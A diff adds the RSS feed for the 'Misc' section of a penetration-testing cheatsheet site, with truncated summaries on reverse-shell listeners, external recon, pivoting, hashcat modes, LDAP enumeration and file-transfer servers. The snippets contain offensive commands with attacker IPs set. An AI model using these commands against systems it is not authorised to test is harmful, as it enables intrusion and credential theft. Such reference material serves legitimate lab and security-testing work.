@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Misc on JinPwn</title>
+    <link>https://jinpwn.dev/cheatsheets/misc/</link>
+    <description>Recent content in Misc on JinPwn</description>
+    <generator>Hugo</generator>
+    <language>en-US</language>
+    <lastBuildDate>Thu, 18 Jun 2026 16:58:31 -0400</lastBuildDate>
+    <atom:link href="https://jinpwn.dev/cheatsheets/misc/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reverse Shells</title>
+      <link>https://jinpwn.dev/cheatsheets/misc/reverse-shells/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/misc/reverse-shells/</guid>
+      <description>Listener first, then the callback. Set attacker IP and port once:
+LHOST=10.10.14.1 LPORT=4444 i. Pick a listener # Plain netcat, no frills:
+nc -lvnp &amp;#34;$LPORT&amp;#34; ncat, supports SSL and multiple clients:
+ncat -lvnp &amp;#34;$LPORT&amp;#34; ncat -lvnp &amp;#34;$LPORT&amp;#34; --ssl ## TLS listener for openssl/curl callbacks ncat -lvnp &amp;#34;$LPORT&amp;#34; --keep-open ## accept multiple connections pwncat-cs, stable PTY + upload/download out of the box, skip the stty dance:
+pwncat-cs -lp &amp;#34;$LPORT&amp;#34; ## If it hangs at &amp;#34;registered new host&amp;#34;, Ctrl-C then type &amp;#39;back&amp;#39; ii. Bash one-liners # The /dev/tcp trick, most common:
+</description>
+    </item>
+    <item>
+      <title>Recon (external)</title>
+      <link>https://jinpwn.dev/cheatsheets/misc/recon-external/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/misc/recon-external/</guid>
+      <description>External attack surface discovery. Domain in scope, find what is exposed. For internal host enum use 01 Recon &amp;amp; Enum .
+DOMAIN=target.com WL=/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt RESOLVERS=/usr/share/wordlists/resolvers.txt Build a fresh resolver list, dead resolvers wreck mass brute-force speed:
+curl -sL https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -o &amp;#34;$RESOLVERS&amp;#34; i. Subdomain enum, passive first # Passive uses cert logs and public datasets, no traffic to target:
+subfinder -d &amp;#34;$DOMAIN&amp;#34; -all -silent -o subs-passive.txt assetfinder --subs-only &amp;#34;$DOMAIN&amp;#34; | tee -a subs-passive.txt amass enum -passive -d &amp;#34;$DOMAIN&amp;#34; -o subs-amass.txt crt.sh, fast and free, one curl:
+</description>
+    </item>
+    <item>
+      <title>Pivoting</title>
+      <link>https://jinpwn.dev/cheatsheets/misc/pivoting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/misc/pivoting/</guid>
+      <description>Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.
+LHOST=10.10.14.1 ## attacker PIVOT=10.10.11.50 ## compromised host INTERNAL=172.16.5.0/24 ## target segment i. Quick decision # SSH on the pivot, you have creds, only SSH allowed out -&amp;gt; ii. SSH tunnels Arbitrary TCP allowed out, you control both ends -&amp;gt; iii. Chisel Need full L3 access (ICMP, UDP, scanning works as if local) -&amp;gt; iv. Ligolo-ng Only HTTPS allowed outbound -&amp;gt; vi. Tunnel over HTTPS Pivot is Windows, no extra binaries allowed -&amp;gt; netsh portproxy + SSH ii. SSH tunnels # Local forward, expose a remote port on your loopback:
+</description>
+    </item>
+    <item>
+      <title>Password Cracking</title>
+      <link>https://jinpwn.dev/cheatsheets/misc/password-cracking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/misc/password-cracking/</guid>
+      <description>Offline hash cracking. Online brute force is in 02 Service Enum under each service.
+WL=/usr/share/wordlists/rockyou.txt RULES=/usr/share/hashcat/rules/best64.rule i. Identify the hash first # hashid &amp;#39;hash-here&amp;#39; hash-identifier nth hash-here ## name-that-hash, most accurate Common modes you will hit on every box:
+Hash hashcat -m Notes MD5 0 almost never alone, often wrapped SHA1 100 same NTLM 1000 local Windows accounts, from SAM NetNTLMv2 5600 from responder / smb relay Kerberos TGS (kerberoast) 13100 $krb5tgs$23$* Kerberos AS-REP 18200 $krb5asrep$23$ MD5crypt 500 $1$ Linux shadow sha256crypt 7400 $5$ sha512crypt 1800 $6$ Linux shadow, SLOW bcrypt 3200 $2a$, $2b$, SLOW MSSQL 2012+ 1731 0x0200... WPA-PBKDF2 22000 new format, replaces 2500 LUKS 14600 also 29541 for LUKS2 7-Zip 11600 $7z$ KeePass 13400 use keepass2john first ii. Hashcat basics # Dictionary attack:
+</description>
+    </item>
+    <item>
+      <title>LDAP</title>
+      <link>https://jinpwn.dev/cheatsheets/misc/ldap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/misc/ldap/</guid>
+      <description>LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .
+DC=10.10.11.50 DOMAIN=corp.local BASE=&amp;#39;DC=corp,DC=local&amp;#39; USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Anonymous bind # Lot of misconfigured DCs allow anonymous read. Always try first.
+ldapsearch -x -H ldap://$DC -s base namingcontexts ldapsearch -x -H ldap://$DC -b &amp;#34;$BASE&amp;#34; What to grep for in anonymous output:
+ldapsearch -x -H ldap://$DC -b &amp;#34;$BASE&amp;#34; | grep -iE &amp;#39;description|userpassword|info|comment&amp;#39; ii. Authenticated bind # ldapsearch -x -H ldap://$DC -D &amp;#34;$USER@$DOMAIN&amp;#34; -w &amp;#34;$PASS&amp;#34; -b &amp;#34;$BASE&amp;#34; Over LDAPS (encrypted, needed for password changes and some attacks):
+</description>
+    </item>
+    <item>
+      <title>File Transfer</title>
+      <link>https://jinpwn.dev/cheatsheets/misc/file-transfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/misc/file-transfer/</guid>
+      <description>Move files between attacker and target. Pick the method that survives the network you are in.
+LHOST=10.10.14.1 i. Serve from attacker # Python HTTP, no uploads:
+python3 -m http.server 80 Python HTTP with upload support, accepts POST to /upload:
+pip install uploadserver python3 -m uploadserver 80 SMB share, useful for Windows targets that block HTTP egress:
+impacket-smbserver share . -smb2support ## guest access impacket-smbserver share . -smb2support -user u -password p ## auth required PHP HTTP, when python is missing:
+</description>
+    </item>
+    <item>
+      <title>Tooling MOC</title>
+      <link>https://jinpwn.dev/cheatsheets/misc/00-tooling-moc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
+      <guid>https://jinpwn.dev/cheatsheets/misc/00-tooling-moc/</guid>
+      <description>Index of tools referenced across the library. One-liner per tool, when to reach for it.</description>
+    </item>
+  </channel>
+</rss>
